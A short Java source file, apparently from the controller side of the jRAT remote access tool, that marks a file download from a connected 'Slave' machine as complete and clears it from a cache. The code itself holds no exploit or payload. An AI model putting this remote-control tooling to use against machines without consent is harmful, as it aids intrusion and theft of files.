package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.common.io.TransferData.State;
import se.jrat.controller.Slave;


public class Packet31CompleteServerDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String file = slave.readLine();
		
		TransferData data = FileCache.get(file);
		data.setState(State.COMPLETED);
		FileCache.clear(file);
	}

}
